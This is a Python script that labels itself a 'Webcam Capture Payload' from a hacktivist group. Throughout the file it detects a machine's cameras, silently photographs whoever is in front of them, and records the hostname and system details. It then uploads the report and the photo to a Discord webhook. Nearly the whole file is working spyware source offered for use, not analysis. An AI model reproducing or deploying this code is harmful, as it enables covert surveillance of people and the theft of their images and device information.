#!/usr/bin/env python3
"""
Webcam Capture Payload
Captures images from connected webcams
⚡ EchoDead - Hacktivist Collective
"""

import os
import sys
import platform
from datetime import datetime
import base64

# Add parent directory to path
sys.path.insert(0, os.path.dirname(__file__))
try:
    from webhook_utils import send_to_discord, send_file_to_discord
    WEBHOOK_AVAILABLE = True
except ImportError:
    WEBHOOK_AVAILABLE = False

def check_opencv():
    """Check if OpenCV is available"""
    try:
        import cv2
        return True, cv2
    except ImportError:
        return False, None

def list_cameras(cv2):
    """List available cameras"""
    cameras = []
    
    # Try first 5 camera indices
    for i in range(5):
        try:
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                cameras.append(i)
                cap.release()
        except:
            pass
    
    return cameras

def capture_image(cv2, camera_index=0, output_path=None):
    """Capture image from webcam"""
    try:
        # Open camera
        cap = cv2.VideoCapture(camera_index)
        
        if not cap.isOpened():
            return False, "Failed to open camera"
        
        # Set resolution (if supported)
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
        
        # Capture frame
        ret, frame = cap.read()
        
        # Release camera
        cap.release()
        
        if not ret:
            return False, "Failed to capture frame"
        
        # Save image
        if output_path is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_path = f"webcam_capture_{timestamp}.jpg"
        
        cv2.imwrite(output_path, frame)
        
        # Get file size
        file_size = os.path.getsize(output_path)
        
        return True, {
            "path": output_path,
            "size": file_size,
            "resolution": f"{frame.shape[1]}x{frame.shape[0]}",
            "camera": camera_index
        }
    
    except Exception as e:
        return False, str(e)

def capture_with_fallback(output_path=None):
    """Capture using available method (Windows-specific fallback)"""
    
    # Try OpenCV first
    has_opencv, cv2 = check_opencv()
    
    if has_opencv:
        print("📷 Using OpenCV for capture...")
        return capture_image(cv2, output_path=output_path)
    
    # Fallback: Windows-specific methods
    if platform.system() == "Windows":
        print("📷 Using Windows fallback method...")
        
        try:
            import subprocess
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_path = output_path or f"webcam_capture_{timestamp}.bmp"
            
            # PowerShell script to capture webcam
            ps_script = f"""
Add-Type -AssemblyName System.Drawing
$capture = New-Object System.Drawing.Bitmap(640, 480)
$graph = [System.Drawing.Graphics]::FromImage($capture)
$graph.CopyFromScreen(0, 0, 0, 0, $capture.Size)
$capture.Save("{output_path}")
"""
            
            # This is a placeholder - actual webcam capture on Windows without OpenCV
            # requires more complex code or external tools
            
            return False, "OpenCV not installed. Install with: pip install opencv-python"
        
        except Exception as e:
            return False, str(e)
    
    return False, "No capture method available. Install opencv-python: pip install opencv-python"

def get_camera_info(cv2):
    """Get detailed camera information"""
    info = {}
    
    try:
        cap = cv2.VideoCapture(0)
        
        if cap.isOpened():
            info['Backend'] = cap.getBackendName()
            info['Width'] = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
            info['Height'] = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
            info['FPS'] = int(cap.get(cv2.CAP_PROP_FPS))
            info['Brightness'] = int(cap.get(cv2.CAP_PROP_BRIGHTNESS))
            info['Contrast'] = int(cap.get(cv2.CAP_PROP_CONTRAST))
            info['Saturation'] = int(cap.get(cv2.CAP_PROP_SATURATION))
            
            cap.release()
    
    except Exception as e:
        info['Error'] = str(e)
    
    return info

def main():
    print("=" * 70)
    print("WEBCAM CAPTURE PAYLOAD")
    print("=" * 70)
    print(f"\nExecution Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Platform: {platform.system()} {platform.release()}")
    print(f"Hostname: {platform.node()}")
    
    # Check OpenCV availability
    has_opencv, cv2 = check_opencv()
    
    if has_opencv:
        print(f"\n✅ OpenCV Version: {cv2.__version__}")
        
        # List cameras
        print("\n🔍 Detecting cameras...")
        cameras = list_cameras(cv2)
        
        if cameras:
            print(f"✅ Found {len(cameras)} camera(s): {cameras}")
            
            # Get camera info
            print("\n📊 Camera Information:")
            cam_info = get_camera_info(cv2)
            for key, value in cam_info.items():
                print(f"  {key}: {value}")
            
            # Capture image
            print("\n📸 Capturing image...")
            success, result = capture_image(cv2, camera_index=cameras[0])
            
            if success:
                print(f"\n✅ Image captured successfully!")
                print(f"  Path: {result['path']}")
                print(f"  Size: {result['size']:,} bytes")
                print(f"  Resolution: {result['resolution']}")
                
                # Prepare report
                report = {
                    "Status": "✅ Capture successful",
                    "Platform": f"{platform.system()} {platform.release()}",
                    "Hostname": platform.node(),
                    "Cameras Found": len(cameras),
                    "File Path": result['path'],
                    "File Size": f"{result['size']:,} bytes",
                    "Resolution": result['resolution'],
                    "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                }
                
                # Send to Discord
                if WEBHOOK_AVAILABLE:
                    print("\n📤 Sending to Discord...")
                    
                    # Send metadata
                    if send_to_discord("📸 Webcam Capture Report", report):
                        print("✅ Report sent!")
                    
                    # Send image (if function exists)
                    if hasattr(sys.modules['webhook_utils'], 'send_file_to_discord'):
                        try:
                            if send_file_to_discord(result['path'], "Webcam capture"):
                                print("✅ Image uploaded!")
                        except Exception as e:
                            print(f"⚠️  Image upload failed: {e}")
                    else:
                        # Send base64-encoded thumbnail
                        try:
                            with open(result['path'], 'rb') as f:
                                img_data = f.read()
                                # Only send first 1000 bytes as preview
                                preview = base64.b64encode(img_data[:1000]).decode('utf-8')
                                print(f"ℹ️  Image preview (truncated): {preview[:100]}...")
                        except Exception as e:
                            print(f"⚠️  Preview generation failed: {e}")
                else:
                    print("\n⚠️  Webhook not available")
                
            else:
                error_msg = result
                print(f"\n❌ Capture failed: {error_msg}")
                
                if WEBHOOK_AVAILABLE:
                    send_to_discord("❌ Webcam Capture Failed", {
                        "Error": error_msg,
                        "Platform": f"{platform.system()}",
                        "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    })
        
        else:
            print("❌ No cameras detected")
            
            if WEBHOOK_AVAILABLE:
                send_to_discord("⚠️  No Cameras Detected", {
                    "Platform": f"{platform.system()} {platform.release()}",
                    "Hostname": platform.node(),
                    "Message": "No webcams found on this system",
                })
    
    else:
        print("\n❌ OpenCV not installed")
        print("\nℹ️  To enable webcam capture, install OpenCV:")
        print("   pip install opencv-python")
        print("\nℹ️  After installation, re-run this payload")
        
        if WEBHOOK_AVAILABLE:
            send_to_discord("⚠️  OpenCV Not Installed", {
                "Platform": f"{platform.system()} {platform.release()}",
                "Hostname": platform.node(),
                "Message": "Install opencv-python to enable webcam capture",
                "Install Command": "pip install opencv-python",
            })
    
    print("\n✅ Webcam capture payload complete!")

if __name__ == "__main__":
    main()
